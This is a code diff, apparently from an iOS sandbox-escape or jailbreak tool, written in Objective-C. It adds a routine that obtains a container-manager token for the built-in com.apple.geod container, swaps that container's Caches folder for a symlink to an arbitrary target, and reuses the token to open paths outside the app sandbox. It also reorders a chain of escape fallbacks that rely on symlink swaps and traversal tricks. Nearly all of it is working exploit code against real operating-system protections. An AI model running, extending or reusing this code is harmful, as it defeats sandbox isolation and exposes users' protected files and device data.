@@ -600,6 +600,93 @@ static int64_t bq_escape_bad_query_file(NSString *caches, NSString **linkOut) {
     return last;
 }
 
+static NSString *bq_query_path_only(uint64_t cls, NSString *ident, BOOL group, uint64_t part, uint64_t flags) {
+    if (!g.create || !ident.length) return nil;
+    void *q = g.create();
+    if (!q) return nil;
+    g.set_class(q, cls);
+    xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
+    if (group && g.set_group_ids) g.set_group_ids(q, x);
+    else if (g.set_ids) g.set_ids(q, x);
+    else if (g.set_group_ids) g.set_group_ids(q, x);
+    if (g.set_part) g.set_part(q, part);
+    if (g.set_flags) g.set_flags(q, flags);
+    if (x && p_xpc_release) p_xpc_release(x);
+    void *res = g.get_one(q);
+    NSString *path = nil;
+    if (res && g.get_path) {
+        const char *cp = g.get_path(res);
+        if (cp) path = [NSString stringWithUTF8String:cp];
+    }
+    g.query_free(q);
+    return path;
+}
+
+// Class 12 held com.apple.geod as a built-in allowed container. The traversal
+// was patched, but a direct part-3 query may still issue a token to an ordinary
+// app. Use geod's writable Library/Caches as the symlink base for the target.
+static int64_t bq_escape_geod_symlink(NSString *target, NSString **linkOut) {
+    NSString *gid = @"com.apple.geod";
+    NSString *caches = bq_query_path_only(12, gid, NO, 3, 0x100000000ULL);
+    if (!caches.length) {
+        NSString *root = bq_query_path_only(12, gid, NO, 0, 0x100000000ULL);
+        if (root.length) caches = [root stringByAppendingPathComponent:@"Library/Caches"];
+    }
+    if (!caches.length) return -2;
+    if ([caches hasPrefix:@"/var/"]) caches = [@"/private" stringByAppendingString:caches];
+
+    NSArray *flags = @[@0x8000000000ULL, @0x0800000000ULL, @0x8100000000ULL];
+    int64_t h1 = -1;
+    uint64_t useFlags = 0;
+    NSString *path = nil;
+    for (NSNumber *n in flags) {
+        h1 = bq_query_escape(12, gid, NO, 3, @"", n.unsignedLongLongValue,
+                             [NSString stringWithFormat:@"class12-geod-direct-%@", n], &path);
+        if (h1 >= 0) { useFlags = n.unsignedLongLongValue; break; }
+    }
+    if (h1 < 0) return h1;
+
+    [[NSFileManager defaultManager] createDirectoryAtPath:caches.stringByDeletingLastPathComponent
+                                 withIntermediateDirectories:YES attributes:nil error:nil];
+    DIR *d = opendir(caches.fileSystemRepresentation);
+    if (!d) {
+        BQLog(@"geod: token did not open %@ errno=%d", caches, errno);
+        if (g.release) g.release(h1);
+        return -5;
+    }
+    closedir(d);
+
+    NSString *bak = [caches stringByAppendingString:@".bqgeod"];
+    bq_recover(caches, bak);
+    if (!bq_swap_path(caches, target, bak)) {
+        bq_restore_path(caches, bak);
+        if (g.release) g.release(h1);
+        return -2;
+    }
+
+    NSString *path2 = nil;
+    int64_t h2 = bq_query_escape(12, gid, NO, 3, @"", useFlags,
+                                 @"class12-geod-symlink", &path2);
+    if (h2 >= 0) {
+        DIR *d2 = opendir(target.fileSystemRepresentation);
+        if (!d2) {
+            BQLog(@"geod: symlink token did not open target");
+            if (g.release) g.release(h2);
+            h2 = -5;
+        } else {
+            closedir(d2);
+        }
+    }
+    bq_restore_path(caches, bak);
+    if (g.release) g.release(h1);
+    if (h2 >= 0) {
+        if (linkOut) *linkOut = target;
+        BQLog(@"escape: using geod class12 symlink -> %@", target);
+        return h2;
+    }
+    return h2;
+}
+
 static int64_t bq_escape_class2_swap(NSString *target, NSString **linkOut) {
     NSString *home = NSHomeDirectory();
     NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
@@ -854,7 +941,18 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 2. App-group part-directory symlink (27.2).
+    // 2. Class 12 geod built-in container: direct token, then symlink Caches.
+    {
+        NSString *link = nil;
+        int64_t h = bq_escape_geod_symlink(target, &link);
+        if (h >= 0) {
+            if (linkOut) *linkOut = link ?: target;
+            return h;
+        }
+        last = h;
+    }
+
+    // 3. App-group part-directory symlink (27.2).
     NSString *gid = BQGroupID();
     if (gid.length) {
         NSString *link = nil;
@@ -867,7 +965,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 3. Swap Library/Caches with a symlink using RENAME_SWAP. This avoids the
+    // 4. Swap Library/Caches with a symlink using RENAME_SWAP. This avoids the
     //    denied plain rename and never moves Library.
     {
         NSString *link = nil;
@@ -880,7 +978,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 4. Class 2 staged symlink: a fake Library/Caches tree inside the app's
+    // 5. Class 2 staged symlink: a fake Library/Caches tree inside the app's
     //    Caches, resolved through a partDomain symlink. Safe and no app group.
     {
         NSString *link = nil;
@@ -893,7 +991,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 5. Class 2 symlink inside the existing Library/Caches. This is safe and
+    // 6. Class 2 symlink inside the existing Library/Caches. This is safe and
     //    needs no app group; it only works if MCM follows a relative symlink in
     //    partDomain without rejecting the resolved target.
     {
@@ -907,7 +1005,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 6. Class 2 parent-directory symlink. No app group needed: move the app's
+    // 7. Class 2 parent-directory symlink. No app group needed: move the app's
     //    Library aside, create Library/Caches -> target, query the app's own
     //    container (class 2), then restore Library. Off by default: some builds
     //    kill the process for moving Library, so this is opt-in from Settings.
@@ -934,7 +1032,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         BQLog(@"class2-parent disabled (enable in Settings if there is no app group)");
     }
 
-    // 7. Class 13 direct MobileGestalt query (some 27.0.x builds).
+    // 8. Class 13 direct MobileGestalt query (some 27.0.x builds).
     if ([target isEqualToString:kMGCaches]) {
         NSString *p = nil;
         int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8000000000ULL,
@@ -947,7 +1045,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 8. Class 12 geod part-domain traversal (older builds).
+    // 9. Class 12 geod part-domain traversal (older builds).
     if (target.isAbsolutePath) {
         NSString *dom = [bq_dots(12) stringByAppendingString:target];
         NSString *p = nil;
